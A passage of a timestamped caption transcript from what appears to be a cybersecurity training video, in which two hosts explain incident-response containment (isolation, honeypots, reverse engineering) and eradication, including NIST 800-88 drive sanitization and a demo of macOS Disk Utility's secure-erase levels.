we\nare deemed as being negligent in some way,\n\n133\n00:06:39.471 --> 00:06:40.430\nshape, or form?\n\n134\n00:06:40.430 --> 00:06:43.424\nLet them answer that question for\nyou because I'm not a lawyer,\n\n135\n00:06:43.424 --> 00:06:45.592\nI know Mike hasn't been\nto law school either.\n\n136\n00:06:45.592 --> 00:06:48.558\nSo, leave the experts to that one.\n\n137\n00:06:48.558 --> 00:06:52.596\nAll right, so, [COUGH] you're gonna\nsee a spiral all rules to isolates.\n\n138\n00:06:52.596 --> 00:06:56.930\nAnd you can just say no traffic from\nbasically the rest of my network.\n\n139\n00:06:56.930 --> 00:07:01.378\nOnly allow the traffic from here to here,\nwhich is the host of the Internet or\n\n140\n00:07:01.378 --> 00:07:05.423\nthe system of posts that have been\ncompromised, keep them talking.\n\n141\n00:07:05.423 --> 00:07:09.194\nAnd then out to the Internet, until you\ncan get your data, or if that, hey you\n\n142\n00:07:09.194 --> 00:07:13.081\nknow what, it's time for us to cut bait,\ngo ahead and stop this attack so that we\n\n143\n00:07:13.081 --> 00:07:17.058\ndon't have to worry about other entities\nbeing compromised through our proxy.\n\n144\n00:07:17.058 --> 00:07:21.267\nAll right, that's segmentation,\nyou remember, and segmentation,\n\n145\n00:07:21.267 --> 00:07:25.408\nyou're still connected to your network,\nyou've just been VLAN off.\n\n146\n00:07:25.408 --> 00:07:28.537\nWhereas isolation is\nthere is absolutely no,\n\n147\n00:07:28.537 --> 00:07:34.075\nyou're still connected to the same network\ncuz all the other host on your system,\n\n148\n00:07:34.075 --> 00:07:38.427\nbut they're completely isolated,\nthere is no talking at all.\n\n149\n00:07:38.427 --> 00:07:43.401\nYou don't even do a router thing\nwhere if I needed to get from one VM\n\n150\n00:07:43.401 --> 00:07:48.392\nto the other in my Quarantine VLAN,\nthat [COUGH] would not happen.\n\n151\n00:07:48.392 --> 00:07:51.471\nThis is complete and total isolation,\n\n152\n00:07:51.471 --> 00:07:55.585\nstill a part of my network but\nnothing talks to this.\n\n153\n00:07:55.585 --> 00:07:59.990\nAgain, we can do this through VLANing,\nor working with firewalls.\n\n154\n00:07:59.990 --> 00:08:04.110\nTo be able to say,\nno communications from anywhere.\n\n155\n00:08:04.110 --> 00:08:09.770\nOr you might actually even\nbypass the firewall completely.\n\n156\n00:08:09.770 --> 00:08:13.220\nYou might just go,\nlet me slap a hub right here.\n\n157\n00:08:13.220 --> 00:08:16.520\nPut my firewall on one port,\nput this host on another port.\n\n158\n00:08:16.520 --> 00:08:20.180\nSo that host can still get\nout to the Internet, right?\n\n159\n00:08:20.180 --> 00:08:22.500\nAnd continue us gathering information.\n\n160\n00:08:22.500 --> 00:08:25.480\nThat's a great way to plug in a fluke or\nsomething like that, for\n\n161\n00:08:25.480 --> 00:08:26.280\ngathering information.\n\n162\n00:08:26.280 --> 00:08:30.310\nPut your monitor there, start looking\nat that information as it comes in.\n\n163\n00:08:30.310 --> 00:08:34.210\nBut it's not connected to those systems,\nall right?\n\n164\n00:08:34.210 --> 00:08:36.090\nIt's completely separated, all right?\n\n165\n00:08:36.090 --> 00:08:37.639\nMaybe even with its own router, right?\n\n166\n00:08:38.850 --> 00:08:39.610\nEven more.\n\n167\n00:08:39.610 --> 00:08:42.460\nThe isolation is the idea is that,\nstill connected but\n\n168\n00:08:42.460 --> 00:08:46.690\nnot to the rest of the world here.\n\n169\n00:08:46.690 --> 00:08:49.830\n&gt;&gt; And the idea is we're trying\nto still gather information but\n\n170\n00:08:49.830 --> 00:08:51.810\nprevent any spread of this infection?\n\n171\n00:08:51.810 --> 00:08:54.970\n&gt;&gt; That's exactly right,\nwe don't want it to spread any further,\n\n172\n00:08:54.970 --> 00:08:57.970\nwe don't even want to hint at the idea\nthat it might be able to use some\n\n173\n00:08:57.970 --> 00:09:01.940\nadvanced technique to hop into\nthe other part of the network.\n\n174\n00:09:01.940 --> 00:09:06.270\nSo, we've kind of isolated it\ninto its own network, right?\n\n175\n00:09:06.270 --> 00:09:08.200\nThere is a couple of\ndifferent types of isolation,\n\n176\n00:09:08.200 --> 00:09:11.930\nhost isolation,\nthat is the idea of moving that host\n\n177\n00:09:11.930 --> 00:09:14.190\nto where it communicates with\nno other hosts on the network.\n\n178\n00:09:14.190 --> 00:09:19.300\nThen you have attacker isolation,\nwhich is, well,\n\n179\n00:09:19.300 --> 00:09:21.620\nwe got,\nwe know these attackers try to come in.\n\n180\n00:09:21.620 --> 00:09:26.630\nLet's give them an inviting target,\nso that you kind of coral that pony\n\n181\n00:09:26.630 --> 00:09:29.220\ninto a place where you can\nbetter control it, right?\n\n182\n00:09:29.220 --> 00:09:30.860\nSo this is the honey pots of the world.\n\n183\n00:09:30.860 --> 00:09:33.600\nYou slept off a honey pot, you go, yeah,\n\n184\n00:09:33.600 --> 00:09:35.310\nover here it looks like\nit's got some good data.\n\n185\n00:09:35.310 --> 00:09:37.070\nYou might want to go check that out.\n\n186\n00:09:37.070 --> 00:09:40.670\nThey attack, they get access and\nnow, you've got them hemmed in.\n\n187\n00:09:40.670 --> 00:09:42.480\nYou can start monitoring from there,\nright?\n\n188\n00:09:43.520 --> 00:09:45.380\nSandbox systems, same idea, right?\n\n189\n00:09:45.380 --> 00:09:48.420\nJust give them an area in\nwhich you are monitoring and\n\n190\n00:09:48.420 --> 00:09:51.680\ncontrolling a whole lot more than\nyou are your production network.\n\n191\n00:09:51.680 --> 00:09:53.350\nThat's where you don't want them, right?\n\n192\n00:09:53.350 --> 00:09:57.175\nSo you're isolating the attacker in your\nown network, if that makes any sense.\n\n193\n00:09:57.175 --> 00:09:58.738\nHopefully it does.\n\n194\n00:09:58.738 --> 00:10:01.570\nAll right,\nthen there' just straight up removal.\n\n195\n00:10:01.570 --> 00:10:06.537\nThis is a valid quarantine where we\ngo yoink, this goes off anything,\n\n196\n00:10:06.537 --> 00:10:12.980\nthis is not connected at all, we're done,\nlet's start remediation, all right?\n\n197\n00:10:12.980 --> 00:10:15.690\nWe don't get the good information that\nwe might get if we leave something\n\n198\n00:10:15.690 --> 00:10:18.055\nonline in someway shape or form.\n\n199\n00:10:18.055 --> 00:10:21.800\nBut that might be the call\nyou have to make.\n\n200\n00:10:21.800 --> 00:10:22.300\n&gt;&gt; Yeah.\nSometimes\n\n201\n00:10:22.300 --> 00:10:23.800\nyou have to weigh your options there.\n\n202\n00:10:23.800 --> 00:10:28.790\nAnd when you look at how much it\nmight cost you per incident of HIPAA\n\n203\n00:10:28.790 --> 00:10:33.730\nregulated or PII that this\nattacker is accessing, versus we'd\n\n204\n00:10:33.730 --> 00:10:37.100\nsure like to get some information on\nthis person that's doing this attack and\n\n205\n00:10:37.100 --> 00:10:39.890\nmaybe prosecute, your company might say,\n\n206\n00:10:39.890 --> 00:10:43.467\nyou know what, we'd love to do that but\nwe've gotta stop the bleeding right now.\n\n207\n00:10:43.467 --> 00:10:44.450\n&gt;&gt; [LAUGH] That's right.\n\n208\n00:10:44.450 --> 00:10:46.640\nWe're hemorraging pretty hard-\n&gt;&gt; Yeah, this is gonna cost us money.\n\n209\n00:10:46.640 --> 00:10:49.490\n&gt;&gt; And yeah, the blood's pumping and\nit's no bueno,\n\n210\n00:10:49.490 --> 00:10:51.430\nwe need to suture this up\nas quickly as possible.\n\n211\n00:10:51.430 --> 00:10:53.510\nSo, Mike is exactly right.\n\n212\n00:10:53.510 --> 00:10:58.610\nThe other thing they call out\nwhen it comes to removal is or\n\n213\n00:10:58.610 --> 00:11:03.540\nI'm sorry, the containment\ntechniques is reverse engineer.\n\n214\n00:11:03.540 --> 00:11:05.200\nI thought it was interesting.\n\n215\n00:11:05.200 --> 00:11:07.280\nBut I guess if you think about it,\n\n216\n00:11:07.280 --> 00:11:12.230\nyou can grab the malware that\nthey're using, reverse engineer it,\n\n217\n00:11:12.230 --> 00:11:16.600\nfind out some interesting\ninformation about your attacker.\n\n218\n00:11:16.600 --> 00:11:19.360\n&gt;&gt; Very true.\nWe see that with a lot of the crypto\n\n219\n00:11:19.360 --> 00:11:20.880\nattacks that have been occurring,\n\n220\n00:11:20.880 --> 00:11:25.200\nwhere they've actually been able to find\neither keys to decrypt the information or\n\n221\n00:11:25.200 --> 00:11:28.950\ninformation about maybe who\nwas instigating that attack.\n\n222\n00:11:28.950 --> 00:11:29.670\n&gt;&gt; Exactly.\n\n223\n00:11:29.670 --> 00:11:31.960\nSo, that being the case,\n\n224\n00:11:31.960 --> 00:11:34.980\nreverse engineering might\nactually be a very helpful thing.\n\n225\n00:11:34.980 --> 00:11:38.070\nSo we can say, well,\nhere's what it's doing.\n\n226\n00:11:38.070 --> 00:11:39.530\nHere's who it's talking to.\n\n227\n00:11:39.530 --> 00:11:42.450\nWe could be able to gather some\nuseful information doing some reverse\n\n228\n00:11:42.450 --> 00:11:44.070\nengineerings techniques.\n\n229\n00:11:44.070 --> 00:11:46.340\nSo, don't leave that out of your ballgame,\nright?\n\n230\n00:11:46.340 --> 00:11:49.890\nSo let's move on to well,\nwhere are we at here, eradication?\n\n231\n00:11:51.050 --> 00:11:52.140\nThat's the next thing on the list.\n\n232\n00:11:52.140 --> 00:11:57.160\nSo now, we isolated in some way,\nwe contained and now,\n\n233\n00:11:57.160 --> 00:12:01.100\nI got all the information I needed, I've\ngot all the forensic evidence that I need?\n\n234\n00:12:01.100 --> 00:12:05.330\nI need to now remove this from\nthe system itself, right?\n\n235\n00:12:05.330 --> 00:12:10.200\nThis is definitely part of the recovery\nprocess because I can't just take this\n\n236\n00:12:10.200 --> 00:12:14.500\nlaptop, I can't take this desktop station,\nseal it off in a corner and go,\n\n237\n00:12:14.500 --> 00:12:16.922\nwell, what are you gonna do, right?\n\n238\n00:12:16.922 --> 00:12:18.440\n&gt;&gt; [LAUGH]\n&gt;&gt; We've pulled the hard drive out,\n\n239\n00:12:18.440 --> 00:12:19.800\nwe've made digital forensic copies.\n\n240\n00:12:19.800 --> 00:12:23.770\nMaybe now, the trials are over,\nif we've done that.\n\n241\n00:12:23.770 --> 00:12:26.180\nI wanna slap that back in there,\nI wanna make it a,\n\n242\n00:12:26.180 --> 00:12:30.000\nI've spent money on this thing,\nI'd like to use it as an asset.\n\n243\n00:12:30.000 --> 00:12:32.300\nI wanna bring it back into life,\nwhat do I do?\n\n244\n00:12:32.300 --> 00:12:34.710\nWell, I need to eradicate any of\nthe problem that may have occurred.\n\n245\n00:12:34.710 --> 00:12:37.630\nAnd there's a couple ways\nin which we can do that.\n\n246\n00:12:37.630 --> 00:12:40.850\nOne would just be, let's reinstall\nthe operating system, right?\n\n247\n00:12:40.850 --> 00:12:42.010\nJust format the drive.\n\n248\n00:12:42.010 --> 00:12:42.690\n&gt;&gt; Wipe it clean.\n\n249\n00:12:42.690 --> 00:12:45.460\n&gt;&gt; Wipe it clean and\nreinstall the operating system.\n\n250\n00:12:45.460 --> 00:12:46.560\nOther would be to reimage it.\n\n251\n00:12:46.560 --> 00:12:48.620\nIf you do imaging inside of your system.\n\n252\n00:12:48.620 --> 00:12:50.280\nMike, what's the imaging?\n\n253\n00:12:50.280 --> 00:12:51.260\n&gt;&gt; Windows Deployment Services.\n\n254\n00:12:51.260 --> 00:12:52.140\n&gt;&gt; Yes, Windows Deployment Services.\n\n255\n00:12:52.140 --> 00:12:54.370\nYou're real familiar with that,\nit's very handy,\n\n256\n00:12:54.370 --> 00:12:58.650\nvery popular because it does a great job\nof deploying an image out to the system.\n\n257\n00:12:58.650 --> 00:13:01.160\nBut you do need to think\nof this when you do that.\n\n258\n00:13:02.450 --> 00:13:04.690\nIf you install the operating system,\n\n259\n00:13:04.690 --> 00:13:09.280\nwasn't the operating system that was\ncompromised that was the vulnerability.\n\n260\n00:13:09.280 --> 00:13:11.420\nWasn't the operating system.\n\n261\n00:13:11.420 --> 00:13:17.890\nSo either if I'm doing a clean wipe and\nreinstallation or I'm doing a re-image,\n\n262\n00:13:17.890 --> 00:13:22.780\nif the operating system is how\nthe attacker got in, then I need to take\n\n263\n00:13:22.780 --> 00:13:27.643\na look at that and make sure that I fixed\nmy image through the necessary patches,\n\n264\n00:13:27.643 --> 00:13:33.660\nto after a clean install or\nre-imaging and then add that to my image.\n\n265\n00:13:33.660 --> 00:13:36.920\nMake sure I take the fresh image\nwith the new patch installed, so\n\n266\n00:13:36.920 --> 00:13:40.070\nthat we're not doing this\nagain in three months.\n\n267\n00:13:40.070 --> 00:13:43.000\nThat's what we want to avoid,\nso keep that in mind.\n\n268\n00:13:44.020 --> 00:13:48.070\nWe also have some ways in\nwhich we can verify that\n\n269\n00:13:48.070 --> 00:13:51.782\nthe drives that we are using\nhave been cleaned sufficiently.\n\n270\n00:13:51.782 --> 00:13:56.390\nAll right, so there are some standards\nthat are called out that we can look to\n\n271\n00:13:56.390 --> 00:14:00.800\nto see,\nam I following best practices for that?\n\n272\n00:14:00.800 --> 00:14:02.870\nAll right.\nSo here I've got this document up.\n\n273\n00:14:02.870 --> 00:14:03.850\nIt's a NIST document.\n\n274\n00:14:03.850 --> 00:14:04.440\nGotta love that.\n\n275\n00:14:04.440 --> 00:14:05.650\nGood old NIST [INAUDIBLE].\n\n276\n00:14:05.650 --> 00:14:06.982\nThey're out there looking out for us.\n\n277\n00:14:06.982 --> 00:14:11.033\nThis is the 800-88.\n\n278\n00:14:11.033 --> 00:14:14.817\nAll right, so you need this course,\nthe link will be in the show notes.\n\n279\n00:14:14.817 --> 00:14:16.804\nThere it is, if you wanna see it.\n\n280\n00:14:16.804 --> 00:14:18.157\nThere you go.\n\n281\n00:14:18.157 --> 00:14:23.510\nSo 800-88, in section 2.4 they\nhave types of sanitization.\n\n282\n00:14:23.510 --> 00:14:29.730\nHow do we sanitize a drive to make\nsure that it is perfectly good to use?\n\n283\n00:14:29.730 --> 00:14:32.660\nAnd this will work for\nus with our digital forensics as well.\n\n284\n00:14:32.660 --> 00:14:37.830\nI need to use a digitally or\nforensically sound wiped drive, right?\n\n285\n00:14:37.830 --> 00:14:39.030\nWe talked about that.\n\n286\n00:14:39.030 --> 00:14:39.680\nRemember I said,\n\n287\n00:14:39.680 --> 00:14:43.180\nif I only had a thumb drive, I could\nkinda show you this using the Mac OS.\n\n288\n00:14:43.180 --> 00:14:45.888\nIt's got a really easy utility for\nmaking this happen.\n\n289\n00:14:45.888 --> 00:14:47.830\n[LAUGH] Guess what?\n\n290\n00:14:47.830 --> 00:14:48.977\nBrought my thumb drive today.\n\n291\n00:14:48.977 --> 00:14:49.960\n&gt;&gt; [LAUGH]\n&gt;&gt; I didn't forget it today,\n\n292\n00:14:49.960 --> 00:14:54.450\nso, it'll allow me to redeem myself\nin showing you what that looks like,\n\n293\n00:14:54.450 --> 00:14:57.070\nat least in an easy, very simplistic way.\n\n294\n00:14:57.070 --> 00:14:59.710\nBut let's take a look at\nthese types of sanitations.\n\n295\n00:14:59.710 --> 00:15:01.910\nYou do need to be kind\nof familiar with this.\n\n296\n00:15:01.910 --> 00:15:09.170\nThey call out disposal clearing,\npurging and destroying.\n\n297\n00:15:09.170 --> 00:15:10.300\nOkay?\n\n298\n00:15:10.300 --> 00:15:15.370\nSo, disposal is the act of discarding\nmedia with no other sanitation\n\n299\n00:15:15.370 --> 00:15:16.930\nconsiderations.\n\n300\n00:15:16.930 --> 00:15:20.730\nThis is most often done by paper\nrecycling containing non-confidential\n\n301\n00:15:20.730 --> 00:15:23.010\ninformation but also include other medium.\n\n302\n00:15:23.010 --> 00:15:25.010\nI will not read the rest of\nthese definitions for you.\n\n303\n00:15:25.010 --> 00:15:28.770\nThis one was short but basically,\nI'm taking this drive.\n\n304\n00:15:28.770 --> 00:15:29.485\nThis is bad.\n\n305\n00:15:29.485 --> 00:15:30.341\n[SOUND] Into the garbage.\n\n306\n00:15:30.341 --> 00:15:32.688\nFile 13, right?\n\n307\n00:15:32.688 --> 00:15:36.390\n&gt;&gt; Which is okay if it's like they said,\nnon-confidential information.\n\n308\n00:15:36.390 --> 00:15:39.130\nMaybe it's publically\navailable information.\n\n309\n00:15:39.130 --> 00:15:41.400\nNot gonna waste\nthe resources wiping it and\n\n310\n00:15:41.400 --> 00:15:44.500\nsanitizing it, if anybody could go\nto our website and get it anyway.\n\n311\n00:15:44.500 --> 00:15:45.360\n&gt;&gt; Exactly.\n&gt;&gt; Right.\n\n312\n00:15:45.360 --> 00:15:50.038\n&gt;&gt; Exactly, the problem comes into when\nit comes to removable media specifically,\n\n313\n00:15:50.038 --> 00:15:53.427\nnot even that,\nespecially hard drives inside a computer,\n\n314\n00:15:53.427 --> 00:15:57.110\nthey typicaly have had data on\nthem that is probably sensitive.\n\n315\n00:15:57.110 --> 00:15:57.880\n&gt;&gt; Always.\n\n316\n00:15:57.880 --> 00:16:00.211\n&gt;&gt; And\njust because you hit the delete button,\n\n317\n00:16:00.211 --> 00:16:02.670\ndoes not neccessarily\nmean that data is gone.\n\n318\n00:16:02.670 --> 00:16:06.709\nRight, this is why the sanitation\ntechniques kind of increase in their\n\n319\n00:16:06.709 --> 00:16:10.005\ncapabilities, as we move on,\nas far as their destructive\n\n320\n00:16:10.005 --> 00:16:13.730\ncapabilities should I say,\nof the data that we want to get rid of.\n\n321\n00:16:13.730 --> 00:16:18.090\nOr we want to hide or\nnot allow someone to easily access.\n\n322\n00:16:18.090 --> 00:16:24.190\nOkay so, as we move on,\nlet's talk about clearing, right?\n\n323\n00:16:24.190 --> 00:16:26.660\nWell this is basically\nhitting that delete key.\n\n324\n00:16:26.660 --> 00:16:29.890\nWhere this was the physical,\nI'll just thow that in the garbage,\n\n325\n00:16:29.890 --> 00:16:33.750\nclearing is the wiping of the data,\nhitting delete, right click, delete,\n\n326\n00:16:33.750 --> 00:16:39.120\nthere's RM-R or what ever it is,\nto just delete those things.\n\n327\n00:16:39.120 --> 00:16:43.150\nAgain, for your casual user,\nthat data's gone.\n\n328\n00:16:43.150 --> 00:16:44.250\nIt does no longer exist.\n\n329\n00:16:44.250 --> 00:16:45.965\nMake sure you delete it from\nthe recycling bin, by the way.\n\n330\n00:16:45.965 --> 00:16:48.135\n&gt;&gt; [LAUGH]\n&gt;&gt; I can't tell you how many people\n\n331\n00:16:48.135 --> 00:16:52.012\nI've gone, they're like, yeah, I used to\nhave all of these incriminating documents,\n\n332\n00:16:52.012 --> 00:16:53.428\nbut you'll never find them now.\n\n333\n00:16:53.428 --> 00:16:54.480\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n334\n00:16:54.480 --> 00:16:55.920\n&gt;&gt; Well look in the recycling bin.\n\n335\n00:16:55.920 --> 00:16:56.525\nDon't you go there.\n\n336\n00:16:56.525 --> 00:16:58.040\n[LAUGH]\n&gt;&gt; You see the panic look-\n\n337\n00:16:58.040 --> 00:16:58.800\n&gt;&gt; Don't open that.\n\n338\n00:16:58.800 --> 00:17:00.982\nIs that Elvis over there?\n\n339\n00:17:00.982 --> 00:17:01.540\n&gt;&gt; [LAUGH]\n&gt;&gt; [LAUGH]\n\n340\n00:17:01.540 --> 00:17:02.730\n&gt;&gt; Don't look in the recycling bin!\n\n341\n00:17:02.730 --> 00:17:06.010\nWhat about the recycling bin?\n\n342\n00:17:06.010 --> 00:17:07.320\nIt's still there.\n\n343\n00:17:07.320 --> 00:17:09.260\nI love that in the Outlook.\n\n344\n00:17:09.260 --> 00:17:11.530\nThey think that, I deleted it.\n\n345\n00:17:11.530 --> 00:17:12.755\nSomeone deleted Adam's folder.\n\n346\n00:17:12.755 --> 00:17:13.810\nThat's not just a storage bin.\n\n347\n00:17:13.810 --> 00:17:16.295\n&gt;&gt; [LAUGH]\n&gt;&gt; You have to purge that stuff out, okay.\n\n348\n00:17:16.295 --> 00:17:21.730\nSo when you hit delete, remember,\nit might not necessarily actually be gone.\n\n349\n00:17:21.730 --> 00:17:26.540\nIt's just removed as accessible\ndirectly from the file system, okay?\n\n350\n00:17:28.170 --> 00:17:31.080\nAll right, let's move on to purging.\n\n351\n00:17:32.380 --> 00:17:37.798\nPurging is a little more inclusive,\n\n352\n00:17:37.798 --> 00:17:41.020\nnow I do want to go back to\nthe clearing the data really quickly,\n\n353\n00:17:41.020 --> 00:17:43.850\ncuz I remember it is a little bit longer.\n\n354\n00:17:43.850 --> 00:17:45.410\nI can overwrite the data.\n\n355\n00:17:45.410 --> 00:17:46.470\nThis will help.\n\n356\n00:17:46.470 --> 00:17:48.360\nAnd that's something that\nI did want to show you.\n\n357\n00:17:48.360 --> 00:17:48.997\nSo let's do that.\n\n358\n00:17:48.997 --> 00:17:50.107\nBefore we get into purging,\n\n359\n00:17:50.107 --> 00:17:52.855\nlet's jump back real quick that\nI kind of jumped the gun here.\n\n360\n00:17:52.855 --> 00:17:55.565\nI'm just so happy to talk\nabout purging cuz it's funny.\n\n361\n00:17:55.565 --> 00:17:57.351\nI'm gonna plug the drive in.\n\n362\n00:17:57.351 --> 00:17:59.315\nWe're gonna see the drive come up.\n\n363\n00:17:59.315 --> 00:18:00.905\n&gt;&gt; Okay.\n&gt;&gt; And then we're gonna do a wipe here.\n\n364\n00:18:00.905 --> 00:18:02.095\nSo let me plug this in.\n\n365\n00:18:02.095 --> 00:18:04.435\nI think it actually goes down.\n\n366\n00:18:04.435 --> 00:18:05.005\nThere we go.\n\n367\n00:18:05.005 --> 00:18:08.685\nWe should see the drive show up\non the screen here momentarily.\n\n368\n00:18:08.685 --> 00:18:10.910\nI will just minimize that.\n\n369\n00:18:10.910 --> 00:18:14.360\nThere we go, secure USB, right there.\n\n370\n00:18:16.020 --> 00:18:17.450\nSo, you've seen the drive.\n\n371\n00:18:17.450 --> 00:18:22.030\nI want to do a good job of\nactually cleaning this drive off.\n\n372\n00:18:22.030 --> 00:18:26.630\nThis could be a hard drive that I've\nplugged in to a slave port or whatever,\n\n373\n00:18:26.630 --> 00:18:30.360\nif I've attached a SATA\nto USB kind of idea.\n\n374\n00:18:30.360 --> 00:18:31.540\nAnyway you like to go for it.\n\n375\n00:18:31.540 --> 00:18:32.340\nRight.\n\n376\n00:18:32.340 --> 00:18:36.060\nWhat I can do is in Mac,\nI say disk utility,\n\n377\n00:18:36.060 --> 00:18:40.405\ndisk utility, there we go,\nand I'll zoom in.\n\n378\n00:18:40.405 --> 00:18:45.100\n[COUGH] And\nhere we see the secure USB drive,\n\n379\n00:18:45.100 --> 00:18:49.290\nI click on that, I have some options\nhere at the top, it's utility.\n\n380\n00:18:49.290 --> 00:18:53.150\nIt's for save, maybe try to recover\nthings if it's having trouble,\n\n381\n00:18:53.150 --> 00:18:57.720\nyou partition it, erase it,\nstore it or unmount it.\n\n382\n00:18:57.720 --> 00:18:59.510\nThat erase button,\nthat's what we're looking for.\n\n383\n00:18:59.510 --> 00:19:00.010\nClick that.\n\n384\n00:19:00.010 --> 00:19:03.450\nI have the ability to change\nthe name of it, the file format,\n\n385\n00:19:03.450 --> 00:19:04.360\nbecause what's it gonna do?\n\n386\n00:19:04.360 --> 00:19:09.450\nIt's gonna erase the, will delete all\ndata stored on it and cannot be undone.\n\n387\n00:19:09.450 --> 00:19:11.720\nProvide a name in a format and\nclick eraser C.\n\n388\n00:19:11.720 --> 00:19:15.480\nAnd you think that it's really simple.\n\n389\n00:19:15.480 --> 00:19:16.930\nLike I said, I can choose the format.\n\n390\n00:19:16.930 --> 00:19:20.820\nIf I wanted to go with some fat table or\nMAC OS.\n\n391\n00:19:20.820 --> 00:19:24.240\nI typically go with XVats because I\nwork within multiple operating systems.\n\n392\n00:19:24.240 --> 00:19:24.910\nSo that helps me out.\n\n393\n00:19:24.910 --> 00:19:27.990\nSo you notice I have this\nsecurity options button.\n\n394\n00:19:29.360 --> 00:19:31.190\nI click that, I get these.\n\n395\n00:19:31.190 --> 00:19:35.010\nThese options specific to how\nto erase the selected disk or\n\n396\n00:19:35.010 --> 00:19:39.910\nvolume to prevent disk recovery\napplications from recovering it.\n\n397\n00:19:39.910 --> 00:19:42.860\nYou harken back to when we were\nplaying around with autopsy,\n\n398\n00:19:42.860 --> 00:19:44.240\nwhat was it able to do?\n\n399\n00:19:44.240 --> 00:19:45.630\nRecover deleted items.\n\n400\n00:19:45.630 --> 00:19:49.070\nThere are specific tools that\nthat's all they do is look for\n\n401\n00:19:49.070 --> 00:19:53.150\ndata that has been marked as deleted but\nis still there.\n\n402\n00:19:53.150 --> 00:19:54.820\nSo it was able to recover that.\n\n403\n00:19:54.820 --> 00:19:56.160\nHow do we fix that?\n\n404\n00:19:56.160 --> 00:19:57.590\nBy using these options.\n\n405\n00:19:57.590 --> 00:20:00.930\nI wouldn't obviously use fastest because\nthis option does not securely erase\n\n406\n00:20:00.930 --> 00:20:02.280\nthe files on the disk.\n\n407\n00:20:02.280 --> 00:20:05.210\nA disk recovery application may\nbe used to recover the files.\n\n408\n00:20:05.210 --> 00:20:07.600\nSo let me bump it up a little bit.\n\n409\n00:20:07.600 --> 00:20:11.950\nAll right, we have a little more secure,\nwhich is this option writes a pass of\n\n410\n00:20:11.950 --> 00:20:16.520\nrandom data, and then a single pass\nof zeroes over the entire disk.\n\n411\n00:20:16.520 --> 00:20:21.450\nAnd then, it says this information,\nthis erased the information used to\n\n412\n00:20:21.450 --> 00:20:24.860\naccess your files and\nwrites over the data two times.\n\n413\n00:20:24.860 --> 00:20:28.670\nSo basically filling up the entire\ndrive with random data.\n\n414\n00:20:28.670 --> 00:20:32.880\nThen it writes a zeroes single pass\nof zeroes over the entire drive.\n\n415\n00:20:33.920 --> 00:20:34.900\nRight.\n\n416\n00:20:34.900 --> 00:20:36.140\nAnd then it does this twice.\n\n417\n00:20:37.310 --> 00:20:44.150\nSo if those file recovery suites are being\nused, it's gonna look and it's gonna dig.\n\n418\n00:20:44.150 --> 00:20:45.860\nIt's like writing on a piece of paper,\n\n419\n00:20:45.860 --> 00:20:49.727\nI write a note to Mike,\nmeet me at the docks at 4:30.\n\n420\n00:20:49.727 --> 00:20:53.900\nAnd then I write the alphabet over\neach one of those letters, right?\n\n421\n00:20:53.900 --> 00:20:57.750\nAnd then I go back and I write a zero\nover each one of those letters.\n\n422\n00:20:57.750 --> 00:21:00.920\nAnd then I do that twice, you're gonna\nhave a hard time seeing that original\n\n423\n00:21:00.920 --> 00:21:02.630\nmessage, and that's the idea, right?\n\n424\n00:21:03.830 --> 00:21:09.227\nWe bump it up one more, we see we get\nDOE compliant three pass secures, right.\n\n425\n00:21:09.227 --> 00:21:12.651\nIt's two passes of random data followed\nby a single pass of known data, over\n\n426\n00:21:12.651 --> 00:21:16.181\nthe entire disk and then it erases the\ninformation used to access your files and\n\n427\n00:21:16.181 --> 00:21:17.750\nwrites over the data three times.\n\n428\n00:21:18.840 --> 00:21:20.360\nSo getting much more secure.\n\n429\n00:21:20.360 --> 00:21:24.190\nRight now we're really making\nit difficult for file recovery.\n\n430\n00:21:24.190 --> 00:21:29.940\nAnd then if we go to most secure, this\noption is the DOD 5220-22 M standard for\n\n431\n00:21:29.940 --> 00:21:32.390\nsecurely erasing magnetic media.\n\n432\n00:21:32.390 --> 00:21:36.140\nIt erases the information used to\naccess your files of the data.\n\n433\n00:21:36.140 --> 00:21:38.098\nSeven times.\n\n434\n00:21:38.098 --> 00:21:38.970\n&gt;&gt; Wow.\n&gt;&gt; So,\n\n435\n00:21:38.970 --> 00:21:40.880\nthis is probably the most\nsecured that you'll see,\n\n436\n00:21:40.880 --> 00:21:46.720\nunless you write your own security\nutility to do that overriding process.\n\n437\n00:21:46.720 --> 00:21:48.530\nYou can get third-party apps\nthat will do this for you.\n\n438\n00:21:48.530 --> 00:21:50.010\nSo, if you're in\nthe Windows Operating System or\n\n439\n00:21:50.010 --> 00:21:53.190\na Linux Operating System,\njust download whatever tool you like.\n\n440\n00:21:53.190 --> 00:21:56.760\nTo make sure that it's\nrespected in the community,\n\n441\n00:21:56.760 --> 00:22:00.330\nnot some fly by night typically,\nfind you a good one, and\n\n442\n00:22:00.330 --> 00:22:03.900\ndo the exact same thing as Dr.\nWest so I would be able to do that.\n\n443\n00:22:05.060 --> 00:22:09.080\nAlright, so\nnow that you've seen how we can clear, so\n\n444\n00:22:09.080 --> 00:22:10.600\nthat I can reuse this drive now.\n\n445\n00:22:10.600 --> 00:22:15.680\nIf I bump that sucker up\nto that DOD 5220 standard.\n\n446\n00:22:15.680 --> 00:22:19.850\nYeah 5220.\nThey're all.\n\n447\n00:22:19.850 --> 00:22:24.510\nI would then be able legitimately\nable to reuse that drive.\n\n448\n00:22:24.510 --> 00:22:27.540\nIt would be, we deem this clean.\n\n449\n00:22:27.540 --> 00:22:31.760\n&gt;&gt; Or dispose of it and not worry about\nsomebody pulling that out of the garbage.\n\n450\n00:22:31.760 --> 00:22:33.600\nAnd trying to recover some of that data.\n\n451\n00:22:33.600 --> 00:22:38.200\n&gt;&gt; Exactly, so if I did want to do both\nof these options, I'm gonna clear it and\n\n452\n00:22:38.200 --> 00:22:39.150\nthen dispose.\n\n453\n00:22:40.410 --> 00:22:42.620\nBecause people do dumpster diving.\n\n454\n00:22:42.620 --> 00:22:48.150\nI remember the first time I saw, an\ninteresting thing about this was printers.\n\n455\n00:22:48.150 --> 00:22:52.680\nA lot of large printers, like the all in\none kind, they have a hard drive in them,\n\n456\n00:22:52.680 --> 00:22:54.820\nso that I can go into the memory.\n\n457\n00:22:54.820 --> 00:22:58.580\nAnd say reprint this document,\nit just writes the file to the hard so\n\n458\n00:22:58.580 --> 00:23:01.436\nyou can keep a giant list of documents.\n\n459\n00:23:01.436 --> 00:23:07.250\nPeople were breaking into lockers\nthat were full of these things and\n\n460\n00:23:07.250 --> 00:23:11.860\nsmashing the hard drives out of them\nlooking for sensitive data, pi EHI,\n\n461\n00:23:11.860 --> 00:23:14.620\nall that other stuff we know\nthat we gotta keep secure.\n\n462\n00:23:14.620 --> 00:23:17.810\nIf I were doing my job as\na security 